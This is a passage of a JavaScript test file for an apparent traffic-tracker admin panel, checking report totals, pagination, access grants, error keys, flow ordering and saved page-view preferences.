eq(roundTrip({grants:{}}, true), {}, 'no grants stay no grants for a role');
eq(roundTrip(null, false), {}, 'no access stays no grants');
eq(roundTrip({sections:['flows']}, true), {}, 'an access without grants stays without');
eq(grantRows({grants:{offers:{mode:'read'}}}, false, RES, MODES).campaigns.mode, '', 'a missing grant shows the empty mode');
eq(grantRows({grants:{campaigns:{mode:'selected'}}}, true, RES, MODES).campaigns.mode, '', 'a role has no selected mode');
const edited=grantRows({grants:{offers:{mode:'read'}}}, false, RES, MODES);
edited.offers.mode='full'; edited.domains.mode='read';
eq(grantsFromRows(edited, false), {offers:{mode:'full'}, domains:{mode:'read'}}, 'an edit changes only the edited rows');

// The report total sums uniq_first, falls back to unique for an old backend, and never sums ratios.
const repRows=[{hits:10,unique:4,uniq_first:3,bots:1,conv:2,profit:5.5},{hits:20,unique:9,uniq_first:6,bots:0,conv:1,profit:1.25}];
eq(reportTotals(repRows), {hits:30,unique:9,bots:1,conv:3,profit:6.75,depsum:0,cost:{}}, 'report total takes the unique of the first step');
eq(reportTotals([{hits:1,depsum:12.5},{hits:1,depsum:'7.5'},{hits:1,depsum:'x'}]).depsum, 20, 'the deposit sum is summed beside revenue, bad numbers count as zero');
eq(reportTotals([{hits:10,unique:4,conv:2},{hits:20,unique:9,conv:1}]).unique, 13, 'an old backend sums unique');
eq(reportTotals([{hits:1,unique:5,uniq_first:0},{hits:1,unique:5}]).unique, 5, 'a zero uniq_first is a value, not a missing field');
eq(reportTotals([{hits:1,uniq_first:2},{hits:1,unique:7}]).unique, 9, 'each row uses its own best field');
eq(reportTotals([{hits:'x',unique:null,conv:undefined,profit:'3'}]), {hits:0,unique:0,bots:0,conv:0,profit:3,depsum:0,cost:{}}, 'bad numbers count as zero');
eq(reportTotals([null,{hits:2}]).hits, 2, 'an empty row is skipped');
eq(reportTotals([]), {hits:0,unique:0,bots:0,conv:0,profit:0,depsum:0,cost:{}}, 'no rows give zero sums');
eq(reportTotals(null).hits, 0, 'no list gives zero sums');
const repCR=reportTotals(repRows);
eq(repCR.conv/repCR.hits, 0.1, 'the total ratio comes from the sums, not from the row ratios');
eq(reportTotals([{hits:1,unique:1,uniq_first:1}]).unique, 1, 'one row keeps its uniques');

// The cost column sums by currency and sorts by one currency, never by a sum of currencies.
const costRows=[{group:'a',cost:{'':300}},{group:'b',cost:{EUR:9000}},{group:'c'},{group:'d',cost:{USD:500,EUR:10}},{group:'e',cost:{'':100}}];
eq(reportTotals(costRows).cost, {USD:900,EUR:9010}, 'cost totals stay per currency, the empty code is USD');
eq(reportCostCur(reportTotals(costRows)), 'EUR', 'the sort currency is the one with the largest cost of the set');
eq(reportCostCur({hits:1,cost:{}}), 'USD', 'without cost the sort currency is the tracker one');
eq(reportCostCur(null), 'USD', 'no totals give the tracker currency');
eq(reportTotals([{hits:1,cost:{'':150,EUR:40}},{hits:1,cost:{USD:10}},{hits:1}]).cost, {USD:160,EUR:40}, 'the cost total adds cents per currency, an empty code is USD');

// A paged report body carries the size and the totals of the whole set; an old answer is one page summed here.
const paged=reportData({rows:[{hits:1}], total:2500, offset:1000, limit:1000, sort:'hits', dir:'desc', totals:{hits:9000,unique:700,bots:3,conv:12,profit:40,depsum:5,cost:{EUR:300}}, truncated:false});
eq(paged.rows, [{hits:1}], 'the page rows are kept as sent');
eq(paged.total, 2500, 'the size of the whole set comes from the server');
eq(paged.totals, {hits:9000,unique:700,bots:3,conv:12,profit:40,depsum:5,cost:{EUR:300}}, 'the totals of the whole set come from the server, not from the page');
eq(paged.truncated, false, 'a whole set is not flagged');
eq(reportData({rows:[], total:0, totals:{hits:0,unique:0,bots:0,conv:0,profit:0,depsum:0}}).totals.cost, {}, 'totals without cost get an empty cost');
eq(reportData({rows:[{hits:1}], total:100001, totals:{hits:5}, truncated:true}).truncated, true, 'a set stopped at the server limit is flagged');
eq(reportData({rows:[], total:3, truncated:'yes'}).truncated, false, 'only true means truncated');
eq(reportData({rows:[{hits:1,uniq_first:1},{hits:2,unique:4}],truncated:true}), {rows:[{hits:1,uniq_first:1},{hits:2,unique:4}],truncated:true,total:2,totals:{hits:3,unique:5,bots:0,conv:0,profit:0,depsum:0,cost:{}}}, 'an older answer without total is one page summed here');
eq(reportData([{hits:2}]).total, 1, 'an older server sends a bare array');
eq(reportData(null), {rows:[],truncated:false,total:0,totals:{hits:0,unique:0,bots:0,conv:0,profit:0,depsum:0,cost:{}}}, 'no body gives no rows');
eq(reportData({rows:'x'}).rows, [], 'bad rows give no rows');
eq(reportData({rows:[], total:-4}).total, 0, 'a negative total is zero');

// The numbered pager shows the ends, two pages around the current one, and an ellipsis only for a gap of two or more pages.
eq(pagerPages(0, 1, 2), [0], 'one page');
eq(pagerPages(0, 5, 2), [0,1,2,3,4], 'five pages fit without a gap');
eq(pagerPages(0, 10, 2), [0,1,2,null,9], 'the start shows its neighbours and the last page');
eq(pagerPages(9, 10, 2), [0,null,7,8,9], 'the end shows the first page and its neighbours');
eq(pagerPages(5, 12, 2), [0,null,3,4,5,6,7,null,11], 'the middle has a gap on both sides');
eq(pagerPages(4, 10, 2), [0,1,2,3,4,5,6,null,9], 'a gap of one page is drawn as that page');
eq(pagerPages(3, 7, 2), [0,1,2,3,4,5,6], 'gaps of one page on both sides are drawn as pages');

// Server error texts of the access, role, spend and landing handlers have keys; a template does not swallow a fixed text.
eq(errKey('network offer_query holds a macro of a hidden field'), 'err.net.querymacro', 'the fixed network text is not taken by the offer_query: template');
eq(errKey('network offer_query: macro {x} may read a hidden field'), 'err.net.query', 'the offer_query: template still wins for a reason');
eq(errKey('read error'), 'err.read', 'read error');
eq(errKey('unknown offer: o1'), 'err.unknown.offer', 'unknown offer link');
eq(errKey('unknown campaign: c1'), 'err.unknown.campaign', 'unknown campaign link');
eq(errKey('alias taken: promo'), 'err.alias', 'alias taken');
eq(errKey('unknown access section: nope'), 'err.access.section', 'unknown access section');
eq(errKey('unknown access resource: nope'), 'err.access.resource', 'unknown access resource');
eq(errKey('unknown access mode: nope'), 'err.access.mode', 'unknown access mode');
eq(errKey('unknown access mode: selected is set per user: offers'), 'err.role.selected', 'a role cannot have selected');
eq(errKey('unknown hidden field: zzz'), 'err.access.hid', 'unknown hidden field');
eq(errKey('amount must be positive'), 'amount must be positive', 'spend amount reuses the existing phrase');
eq(errKey('some text nobody translated'), '', 'an unknown text has no key');
eq(errInfo('unknown offer: o1').vars, {id:'o1'}, 'the link id fills the text');
eq(errInfo('alias taken: promo').vars, {alias:'promo'}, 'the alias fills the text');

// Browser prefs fill an empty server copy: persisted for a writer, in memory only for anyone else; a non-empty server copy always wins.
eq(uiSeedPlan({cols:{},dash:{panels:null,dim:''}}, true), {seed:true,persist:true}, 'an empty server copy is seeded and saved for a writer');
eq(uiSeedPlan({cols:{},dash:{panels:null,dim:''}}, false), {seed:true,persist:false}, 'an empty server copy is seeded in memory for a reader');
eq(uiSeedPlan({cols:{logs:[{id:'ts',on:true}]},dash:{panels:null,dim:''}}, true), {seed:false,persist:false}, 'server columns win for a writer');
eq(uiSeedPlan({cols:{logs:[{id:'ts',on:true}]},dash:{panels:null,dim:''}}, false), {seed:false,persist:false}, 'server columns win for a reader');
eq(uiSeedPlan({cols:{},dash:{panels:['country'],dim:''}}, false).seed, false, 'server panels win');
eq(uiSeedPlan({cols:{},dash:{panels:null,dim:'sub_id_1'}}, true).seed, false, 'a server dimension wins');
eq(uiSeedPlan({cols:{},dash:{panels:[],dim:''}}, true).seed, false, 'an empty panel list is a choice, not a missing one');
eq(uiSeedPlan(null, false), {seed:true,persist:false}, 'no prefs at all is empty');
const readerUI={cols:{},dash:{panels:null,dim:''}}, readerStore={'k-logs':JSON.stringify([{id:'ip',on:1}]),'k-dim':'sub_id_3'};
const readerPlan=uiSeedPlan(readerUI, false);
const readerMoved=readerPlan.seed?seedUI(readerUI, k=>readerStore[k]===undefined?null:readerStore[k], {logs:'k-logs'}, 'k-dim'):[];
eq([readerUI.cols.logs, readerUI.dash.dim, readerPlan.persist], [[{id:'ip',on:true}],'sub_id_3',false], 'a reader sees the browser choices without a save');
eq(Object.keys(readerStore).length, 2, 'seeding never touches the browser keys');
eq(readerMoved.length, 2, 'the moved keys are reported for a writer to drop');

// The one-time transfer of the old browser prefs fills only what the browser has and names the keys it took.
const ckeys={logs:'k-logs',conv:'k-conv',report:'k-rep'};
const store={'k-logs':JSON.stringify([{id:'ts',on:1},{id:'ip',on:0}]),'k-conv':JSON.stringify({a:true}),'k-rep':'not json','k-dim':'sub_id_2'};
const seedTo={cols:{},dash:{dim:''}};
const movedKeys=seedUI(seedTo, k=>store[k]===undefined?null:store[k], ckeys, 'k-dim');
eq(movedKeys, ['k-logs','k-conv','k-dim'], 'seedUI names the moved keys and skips broken ones');
eq(seedTo.cols, {logs:[{id:'ts',on:true},{id:'ip',on:false}],conv:{a:true}}, 'seedUI copies the column lists');
eq(seedTo.dash.dim, 'sub_id_2', 'seedUI copies the dimension');
const seedNone={cols:{},dash:{dim:''}};
eq(seedUI(seedNone, ()=>null, ckeys, 'k-dim'), [], 'an empty browser moves nothing');
eq(seedNone, {cols:{},dash:{dim:''}}, 'an empty browser leaves the prefs alone');
eq(seedUI({cols:{},dash:{dim:''}}, ()=>{throw new Error('blocked')}, ckeys, 'k-dim'), [], 'a blocked storage moves nothing');

// Cards of hidden dimensions are not shown.
eq(visibleDims({hidden:['country','org']}, ['country','device','os','browser','domain','org']), ['device','os','browser','domain'], 'hidden dimensions have no card');
eq(visibleDims(null, ['country','device']), ['country','device'], 'administrators see every card');
eq(visibleDims({hidden:['cost']}, ['country']), ['country'], 'an unrelated hidden field keeps the cards');
eq(visibleDims({hidden:['country']}, null), [], 'no dimensions give none');

// A stream with a macro-like text in its output is flagged for a guarded user only.
eq(streamOutputGuarded({hidden:['ip']}, {curl:'a->b?x=[IP]'}), true, 'macro in curl');
eq(streamOutputGuarded({hidden:['ip']}, {b_curl:'a->{sub_id_1}'}), true, 'macro in b_curl');
eq(streamOutputGuarded({hidden:['ip']}, {remote:{url:'https://x.test/?k={keyword}'}}), true, 'macro in remote url');
eq(streamOutputGuarded({hidden:['ip']}, {curl:'a->b', remote:{url:'https://x.test/'}}), false, 'no macro, no warning');
eq(streamOutputGuarded({hidden:[]}, {curl:'[IP]'}), false, 'nothing hidden, no warning');
eq(streamOutputGuarded(null, {curl:'[IP]'}), false, 'administrators get no warning');
eq(streamOutputGuarded({hidden:['ip']}, null), false, 'no stream, no warning');
eq(streamOutputGuarded({hidden:['ip']}, {curl:'[ ]'}), false, 'brackets with only spaces are not a macro');
eq(errInfo('something new'), null, 'an unknown text has no key');
eq(homePage({access:{sections:['flows']}, pages:['flows']}), 'flows', 'homePage flows');
eq(homePage({access:{sections:[]}, pages:[]}), 'settings', 'homePage no dashboard');

eq(userIsEnv({source:'env'}), true, 'userIsEnv env');
eq(userIsEnv({source:'file'}), false, 'userIsEnv file');
eq(userIsEnv(null), false, 'userIsEnv null');
eq(moneyText(42814.27,'USD',2),'42,814.27 $','money tile USD');
eq(moneyText(1234.5,'EUR',2),'1,234.50 EUR','money tile other code');
eq(moneyText(10,'',2),'10.00 $','money tile without code is USD');
eq(moneyText('x','USD',2),'0.00 $','money tile non-number');
eq(flowCompactClass(true),'compact','flowCompactClass on');
eq(flowCompactClass(false),'','flowCompactClass off');
const trafHits=[5,0,12,5,null,30,'7'];
const trafCopy=JSON.stringify(trafHits);
eq(flowTrafficOrder(trafHits,''),[0,1,2,3,4,5,6],'traffic order off keeps the stored order');
eq(flowTrafficOrder(trafHits,'desc'),[5,2,6,0,3,1,4],'traffic order desc: most first, ties stable, empty last');
eq(flowTrafficOrder(trafHits,'asc'),[0,3,6,2,5,1,4],'traffic order asc: fewest first, ties stable, empty still last');
eq(flowTrafficOrder(trafHits,'bogus'),[0,1,2,3,4,5,6],'unknown traffic order is off');
eq(JSON.stringify(trafHits),trafCopy,'flowTrafficOrder does not change its input');
eq(flowTrafficOrder(null,'desc'),[],'flowTrafficOrder without hits');
eq([flowTrafficNext(''),flowTrafficNext('asc'),flowTrafficNext('desc'),flowTrafficNext('rev-asc'),flowTrafficNext('rev-desc'),flowTrafficNext('x')],['asc','desc','rev-asc','rev-desc','','asc'],'canvas order cycles off, traffic fewest, traffic most, revenue least, revenue most');
const rev=[0,12.5,0,null,3,12.5,-1];
const revCopy=JSON.stringify(rev);
eq(flowTrafficOrder(rev,''),[0,1,2,3,4,5,6],'revenue order off keeps the stored order');
eq(flowTrafficOrder(rev,'rev-asc'),[6,0,2,3,4,1,5],'revenue asc: least first, missing is 0, ties stable');
eq(flowTrafficOrder(rev,'rev-desc'),[1,5,4,0,2,3,6],'revenue desc: most first, zeros keep order, ties stable');
eq(flowTrafficOrder(rev,'rev-asc'),flowTrafficOrder(rev,'rev-asc'),'revenue order stays put on a second pass');
eq(JSON.stringify(rev),revCopy,'revenue order does not change its input');
eq(flowTrafficOrder([0,5,0],'rev-asc'),[0,2,1],'revenue asc sorts a zero as zero, not last');
eq(flowTrafficOrder([0,5,0],'rev-desc'),[1,0,2],'revenue desc puts the amount first and keeps the zero tie');
eq(flowTrafficOrder([2,2,1],'rev-desc'),[0,1,2],'equal revenue keeps the stored order');
eq(flowTrafficOrder([null,undefined,'',0,1],'rev-asc'),[0,1,2,3,4],'missing revenue sorts as 0 ahead of a positive');
eq(flowTrafficOrder([null,undefined,'',0,1],'rev-desc'),[4,0,1,2,3],'missing revenue sorts as 0 after a positive');
eq(flowCanvasValue({profit:4.5,hits:9},'rev-asc'),4.5,'revenue order uses the stream profit');
eq(flowCanvasValue({hits:9},'rev-desc'),0,'missing revenue is 0');
eq(flowCanvasValue({profit:0,hits:9},'rev-asc'),0,'zero revenue stays 0');
eq(flowCanvasValue({profit:-2,hits:9},'rev-desc'),-2,'a negative revenue stays the shown amount');
eq(flowCanvasValue({profit:4,hits:9},'asc'),9,'traffic order uses visits');
eq(flowCanvasValue(null,'rev-asc'),0,'revenue order without a stream is 0');
eq(recentRows([{ts:1},{ts:2},{ts:3}],2).length,2,'recentRows keeps n');
eq(recentRows(null,5).length,0,'recentRows without rows');
eq(recentRows([{ts:1},null,{ts:2}],5).length,2,'recentRows drops empties');

eq(serviceBadge('geo_db', {config_error:'bad db'}), {key:'cron.cfgerr', title:'bad db'}, 'config error wins');
eq(serviceBadge('telegram_test', {telegram_configured:false}), {key:'cron.notset', title:''}, 'telegram off');
eq(serviceBadge('telegram_test', {telegram_configured:true}), {key:'cron.first', title:''}, 'telegram waits');
eq(serviceBadge('geo_db', {geo_paths:{city_file:true, asn_file:true}}), {key:'cron.notset', title:''}, 'geo without sources');
eq(serviceBadge('geo_db', {config:{geo_db:{sources:[{kind:'city'}]}}, geo_paths:{city_file:true, asn_file:false}, status:{jobs:{geo_db:{last_run:'2020-01-02T00:00:00Z', next_run:'2020-01-03T00:00:00Z', ok:true}}}}).key, 'cron.next', 'city source keeps the next run');
eq(serviceBadge('geo_db', {config:{geo_db:{sources:[{kind:'city'}]}}, geo_paths:{city_file:false, asn_file:''}}), {key:'cron.notset', title:'cron.nofile'}, 'sources but no files');
eq(serviceBadge('geo_db', {config:{geo_db:{sources:[{kind:'city'}]}}, geo_paths:{city_file:true, asn_file:false}}), {key:'cron.first', title:''}, 'city source waits for its file');
eq(serviceBadge('ip_lists', {status:{jobs:{}}}), {key:'cron.first', title:''}, 'no last run');
eq(serviceBadge('ip_lists', {status:{jobs:{ip_lists:{last_run:'2020-01-02T00:00:00Z', next_run:'2020-01-03T00:00:00Z', ok:true, message:'ip_google: 120'}}}}), {key:'cron.next', title:'2020-01-03T00:00:00Z'}, 'next run');
eq(serviceBadge('disk', {status:{jobs:{disk:{last_run:'2020-01-02T00:00:00Z', ok:false, error:'full'}}}}).key, 'failed', 'ran without next');
eq(serviceBadge('disk', {config_error:'x', telegram_configured:false, status:{jobs:{disk:{last_run:'2020-01-02T00:00:00Z', next_run:'2020-01-03T00:00:00Z'}}}}).key, 'cron.cfgerr', 'config before next');
eq(serviceBadge('conversions', {status:{jobs:{conversions:{last_run:'0001-01-01T00:00:00Z'}}}}).key, 'cron.first', 'zero time is the first run');
eq(serviceBadge('keitaro_sync', {keitaro_configured:false}), {key:'cron.ktsync.off', title:''}, 'keitaro sync off without integration');
eq(serviceBadge('keitaro_sync', {keitaro_configured:true, status:{jobs:{keitaro_sync:{last_run:'2020-01-02T00:00:00Z', next_run:'2020-01-03T00:00:00Z', ok:true}}}}).key, 'cron.next', 'keitaro sync next run');
const cronIds=['telegram','ip_lists','geo_db','conversions'];
eq(cronCardOrder(cronIds, ['geo_db','telegram']), ['geo_db','telegram','ip_lists','conversions'], 'cronCardOrder saved reorders known ids');
eq(cronCardOrder(cronIds, ['nope','telegram']), ['telegram','ip_lists','geo_db','conversions'], 'cronCardOrder drops unknown saved ids');
eq(cronCardOrder(cronIds, ['telegram','ip_lists','keitaro_sync']), ['telegram','ip_lists','geo_db','conversions'], 'cronCardOrder appends new default ids');
eq(cronCardOrder(cronIds, null), cronIds, 'cronCardOrder null saved keeps default');
eq(cronCardOrder(cronIds, ['geo_db','geo_db','telegram']), ['geo_db','telegram','ip_lists','conversions'], 'cronCardOrder collapses duplicate saved ids');
{
  const def = defaultPageViewState();
  const st = applyPageViews({
    bogus: 1,
    range: { id: 'nope' },
    flows: { sort: { k: 'name', dir: 1 }, q: 'casino', state: 'on', source: 's1', folder: 'f1' },
    logs: { conds: [{ f: 'ip', op: 'eq', v: ['203.0.113.1'] }] },
    offers: { sort: 'name' },
  }, def);
  eq(st.flows.sort, { k: 'name', dir: 1 }, 'page views flows sort');
  eq(st.flows.q, 'casino', 'page views flows search');
  eq(st.flows.state, 'on', 'page views flows state');
  eq(st.range.id, 'today', 'page views bad range id dropped');
  eq(st.offers.sort, def.offers.sort, 'page views bad sort type dropped');
  eq(st.logs.conds.length, 1, 'page views log conds kept');
  const put = collectPageViews(st);
  eq(put.dashboard.psort.k, 'conv', 'page views collect dashboard psort');
  eq(put.flows.sort, { k: 'name', dir: 1 }, 'page views collect flows sort');
  eq(put.logs.conds[0].f, 'ip', 'page views collect log conds');
  eq('bogus' in put, false, 'page views unknown key not collected');
  const st2 = applyPageViews(put, def);
  eq(st2.flows.sort, { k: 'name', dir: 1 }, 'page views round trip flows sort');
  const withCamp = JSON.parse(JSON.stringify(st));
  withCamp.logs.conds.push({ f: 'campaign_id', op: 'eq', v: ['g1'] });
  eq(collectPageViews(withCamp).logs.conds.some(c => c.f === 'campaign_id'), true, 'page views manual campaign cond saved');
  eq(applyPageViews({ range: { id: 'week' } }, def).range.id, 'week', 'page views period week');
  eq(collectPageViews(def).dashboard.campaign, undefined, 'no kept campaign is not in the body');
  const kept = applyPageViews({ dashboard: { campaign: ' promo ' } }, def);
  eq(kept.dashCampaign, 'promo', 'the kept campaign is read trimmed');
  eq(collectPageViews(kept).dashboard.campaign, 'promo', 'the kept campaign is written back');
  eq(applyPageViews(collectPageViews(kept), def).dashCampaign, 'promo', 'the kept campaign survives collect then apply');
  eq(applyPageViews({ dashboard: { campaign: '' } }, kept).dashCampaign, undefined, 'an empty campaign clears the choice');
  eq(applyPageViews({ dashboard: { campaign: 7 } }, kept).dashCampaign, 'promo', 'a campaign that is not text is ignored');
  eq('campaign' in collectPageViews(applyPageViews({ dashboard: { campaign: '' } }, kept)).dashboard, false, 'a cleared campaign leaves no key behind');
}
{
  const def = defaultPageViewState();
  const sorted = applyPageViews({ flows: { sort: { k: 'name', dir: 1 } } }, def);
  eq(collectPageViews(sorted).flows.sort, { k: 'name', dir: 1 }, 'flows sort by name survives collect');
  eq(applyPageViews(collectPageViews(sorted), def).flows.sort, { k: 'name', dir: 1 }, 'flows sort by name survives collect then apply');
  eq(def.flows.cols, null, 'no column set by default');
  eq(collectPageViews(def).flows.cols, undefined, 'an absent column set is not in the body');
  eq(JSON.stringify(collectPageViews(def)).includes('null'), false, 'the default body holds no null');

  const cols = applyPageViews({ flows: { cols: [
    { id: 'name', on: true }, { id: 'hits', on: false }, { id: 'name', on: false },
    null, 'x', { id: 7, on: true }, { id: '', on: true }, { id: 'y'.repeat(65), on: true }, { on: true }, { id: 'cr', on: 1 },
  ] } }, def);
  eq(cols.flows.cols, [{ id: 'name', on: true }, { id: 'hits', on: false }, { id: 'cr', on: true }], 'column set drops junk and repeated ids');
  eq(collectPageViews(cols).flows.cols, cols.flows.cols, 'column set is kept by collect');
  eq(applyPageViews({ flows: { cols: [] } }, def).flows.cols, null, 'an empty column set is no set');
  eq(applyPageViews({ flows: { cols: 'name' } }, def).flows.cols, null, 'a column set that is not a list is no set');
  eq(pageViewCols(null), null, 'null column set stays null');
  const many = Array.from({ length: 300 }, (_, i) => ({ id: 'c' + i, on: true }));
  eq(pageViewCols(many).length, 200, 'a column set is cut at 200 rows');
  const kinds = { flows: 'flows', logs: 'logs', conv: 'conversions', report: 'report', offers: 'offers', networks: 'networks', landings: 'landings', domains: 'domains' };
  eq(PAGE_VIEW_COLS_PAGE, kinds, 'every column kind has its page key');
  const all = {};
  Object.keys(kinds).forEach(k => { all[kinds[k]] = { cols: [{ id: k, on: true }] }; });
  const allPut = collectPageViews(applyPageViews(all, def));
  eq(Object.keys(kinds).every(k => JSON.stringify(allPut[kinds[k]].cols) === JSON.stringify([{ id: k, on: true }])), true, 'every page keeps its own column set');

  const paged = applyPageViews({ flows: { page: 250, view: 'grid', compact: true }, logs: { page: 500 }, conversions: { page: 20 }, domains: { page: 5000 } }, def);
  eq([paged.flows.page, paged.flows.view, paged.flows.compact, paged.logs.page, paged.conversions.page, paged.domains.page], [250, 'grid', true, 500, 20, 5000], 'page sizes and flow view are read');
  const put = collectPageViews(paged);
  eq([put.flows.page, put.flows.view, put.flows.compact, put.logs.page, put.conversions.page, put.domains.page], [250, 'grid', true, 500, 20, 5000], 'page sizes and flow view are collected');
  const bad = applyPageViews({ flows: { page: 5001, view: 'list', compact: 'yes' }, logs: { page: 1001 }, conversions: { page: 0 }, domains: { page: 1.5 } }, def);
  eq([bad.flows.page, bad.flows.view, bad.flows.compact, bad.logs.page, bad.conversions.page, bad.domains.page], [1000, 'table', false, 100, 50, 50], 'a size out of range or a bad view falls back');
  eq(collectPageViews({ flows: { page: '12', view: 'list', compact: 1 }, logs: { page: -3 } }).flows, { sort: { k: '', dir: -1 }, q: '', state: 'all', source: '', folder: '', view: 'table', compact: false, traffic: '', page: 1000 }, 'collect falls back on bad values');
  eq(collectPageViews(applyPageViews({ flows: { traffic: 'desc' } }, def)).flows.traffic, 'desc', 'the canvas traffic order is read and collected');
  eq(collectPageViews(applyPageViews({ flows: { traffic: 'rev-asc' } }, def)).flows.traffic, 'rev-asc', 'the canvas revenue order is read and collected');
  eq(applyPageViews({ flows: { traffic: 'up' } }, def).flows.traffic, '', 'an unknown traffic order falls back to off');
  eq(def.flows.traffic, '', 'the traffic order is off by default');
  const legacy = JSON.parse(JSON.stringify(def)); legacy.flows.page = 25; legacy.flows.view = 'grid';
  eq(applyPageViews({ flows: { page: 100 } }, legacy).flows.page, 100, 'the account size wins over the browser one');
  eq(applyPageViews({ flows: { q: 'x' } }, legacy).flows.view, 'grid', 'a browser value stays when the account has none');

  const tabs = applyPageViews({ users: { sort: { k: 'login', dir: 1 } }, roles: { sort: { k: 'name', dir: -1 } }, keywords: { sort: { k: 'key', dir: 1 } } }, def);
  eq([tabs.users.sort, tabs.roles.sort, tabs.keywords.sort], [{ k: 'login', dir: 1 }, { k: 'name', dir: -1 }, { k: 'key', dir: 1 }], 'users, roles and keywords sorts are read');
  const tabsPut = collectPageViews(tabs);
  eq([tabsPut.users.sort, tabsPut.roles.sort, tabsPut.keywords.sort], [{ k: 'login', dir: 1 }, { k: 'name', dir: -1 }, { k: 'key', dir: 1 }], 'users, roles and keywords sorts are collected');
  eq(collectPageViews(def).users, { sort: { k: '', dir: -1 } }, 'users view is in every body');

  eq(collectPageViews(def).keyword_stats, { sort: { k: '', dir: -1 }, campaign: '', by: '', conds: [], page: 1000 }, 'keyword statistics view is in every body with its defaults');
  eq([collectPageViews(def).report.page, def.report.page], [1000, 1000], 'the report shows 1000 rows by default');
  const rp = applyPageViews({ report: { page: 500 }, keyword_stats: { page: 2000 } }, def);
  eq([rp.report.page, rp.keyword_stats.page, collectPageViews(rp).report.page, collectPageViews(rp).keyword_stats.page], [500, 2000, 500, 2000], 'report and keyword page sizes are read and collected');
  const rpBad = applyPageViews({ report: { page: 2001 }, keyword_stats: { page: 0 } }, def);
  eq([rpBad.report.page, rpBad.keyword_stats.page], [1000, 1000], 'a report or keyword size out of range falls back');
  const kw = applyPageViews({ keyword_stats: { sort: { k: 'hits', dir: 1 }, campaign: ' promo ', by: 'origin', conds: [{ f: 'country', op: 'eq', v: ['PL'] }, { f: '', op: 'eq', v: ['x'] }] }, keywords: { sort: { k: 'key', dir: -1 } } }, def);
  eq(kw.keyword_stats, { sort: { k: 'hits', dir: 1 }, campaign: 'promo', by: 'origin', conds: [{ f: 'country', op: 'eq', v: ['PL'] }], page: 1000 }, 'keyword statistics sort, campaign, attribution and conditions are read');
  eq(collectPageViews(kw).keyword_stats, kw.keyword_stats, 'keyword statistics view is collected as read');
  eq(collectPageViews(kw).keywords, { sort: { k: 'key', dir: -1 } }, 'the API key sort keeps its own page key');
  eq(applyPageViews({ keyword_stats: { campaign: 7, conds: 'x', sort: 'hits' } }, def).keyword_stats, def.keyword_stats, 'bad keyword statistics values fall back');
  eq(applyPageViews({ keyword_stats: { by: 'other' } }, def).keyword_stats.by, '', 'an unknown keyword attribution falls back');

  eq(def.logs.pblogSort, { k: 'ts', dir: -1 }, 'S2S log default sort');
  const pb = applyPageViews({ logs: { pblogSort: { k: 'payout', dir: 1 } } }, def);
  eq(pb.logs.pblogSort, { k: 'payout', dir: 1 }, 'S2S log sort is read');
  eq(collectPageViews(pb).logs.pblogSort, { k: 'payout', dir: 1 }, 'S2S log sort is collected');
  eq(applyPageViews({ logs: { pblogSort: 'payout' } }, def).logs.pblogSort, { k: 'ts', dir: -1 }, 'a bad S2S log sort falls back');
  eq(collectPageViews({}).logs.pblogSort, { k: 'ts', dir: -1 }, 'an empty snapshot collects the S2S default');
  eq(pageViewsPull('a', 'a', 'b'), 'apply', 'a changed server copy replaces an untouched local one');
  eq(pageViewsPull('a', 'a', 'a'), 'skip', 'an equal server copy changes nothing');
  eq(pageViewsPull('c', 'a', 'b'), 'skip', 'unsent local changes win over the server copy');
  eq(pageViewsPull('c', 'a', 'a'), 'skip', 'unsent local changes with an unchanged server copy are left to the flush');
  eq(pageViewsPull('c', 'a', 'c'), 'skip', 'a server copy equal to the local one needs no apply while the last sent differs');
  eq(pageViewsPull('', '', JSON.stringify(collectPageViews(def))), 'apply', 'a server copy against an empty last sent is applied');
  eq(Object.keys(collectPageViews(def)).sort(), ['conversions', 'dashboard', 'domains', 'flows', 'keyword_stats', 'keywords', 'landings', 'logs', 'networks', 'offers', 'range', 'report', 'roles', 'sources', 'users'], 'the body holds exactly the stored pages');
  eq(pageViewUI({accent:'#AABBCC', token:'sekret', theme:'dark', layout:'wide', assistant:'docs', lang:'ru', tz:'UTC', board:'main', dock:{x:10,y:20}, menu:{order:['flows','flows'], hidden:{logs:true}}, cols:{'flows\nname':{name:180, tiny:2}}}),
    {theme:'dark', accent:'#aabbcc', layout:'wide', menu:{order:['flows'], hidden:{logs:true}}, cols:{'flows\nname':{name:180}}, dock:{x:10, y:20}, assistant:'docs'},
    'ui keeps the theme, the accent, the width, the menu, the column widths, the dock and the assistant tab');
  eq(pageViewUI({lang:'ru', tz:'UTC', token:'x'}), null, 'ui does not keep the language, the zone or a token');
  const localPages={flows:{q:'a'}, dashboard:{psort:{k:'conv', d:-1}}};
  const serverPages={flows:{q:'b'}, dashboard:{psort:{k:'conv', d:-1}}, logs:{tab:'traffic'}};
  eq(pageViewsPutBody(localPages, serverPages, 3, 'uid-1').flows, {q:'a'}, 'a put sends the page that changed');
  eq(pageViewsPutBody(localPages, serverPages, 3, 'uid-1').logs, undefined, 'a put leaves out a page that did not change');
  eq([pageViewsPutBody(localPages, serverPages, 3, 'uid-1').rev, pageViewsPutBody(localPages, serverPages, 3, 'uid-1').owner], [3, 'uid-1'], 'a put carries the revision and the owner');
  eq(pageViewsOverlay(localPages, serverPages).flows, {q:'a'}, 'a conflict keeps this tab page');
  eq(pageViewsOverlay(localPages, serverPages).logs.tab, 'traffic', 'a conflict keeps the other page from the server');
}
{
  const def = defaultPageViewState();
  const st = applyPageViews({
    bogus: 1,
    dashboard: { panels: ['country', 'device', 'bogus'], dim: 'sub_id_2' },
    automation: { order: ['telegram', 'geo_db', 'telegram'] },
  }, def);
  eq(st.dashPanels, ['country', 'device'], 'dashboard panels filtered');
  eq(st.dashDim, 'sub_id_2', 'dashboard dim stored');
  eq(st.automationOrder, ['telegram', 'geo_db'], 'automation order deduped');
  const put = collectPageViews(st);
  eq(put.dashboard.panels, ['country', 'device'], 'collect dashboard panels');
  eq(put.dashboard.dim, 'sub_id_2', 'collect dashboard dim');
  eq(put.automation.order, ['telegram', 'geo_db'], 'collect automation order');
  eq('bogus' in put, false, 'unknown page key not collected');
  const st2 = applyPageViews(put, def);
  eq(st2.dashPanels, ['country', 'device'], 'round trip dashboard panels');
  eq(st2.dashDim, 'sub_id_2', 'round trip dashboard dim');
  eq(st2.automationOrder, ['telegram', 'geo_db'], 'round trip automation order');
  eq(pageViewDashPanels(null), null, 'null panels means all visible');
  eq(pageViewDashPanels([]), [], 'empty panels list');
}
{
  // Integrations the user added to the side list live on the account; the list is kept only once set.
  const def = defaultPageViewState();
  eq('integrations' in collectPageViews(def), false, 'nothing added means no integrations key');
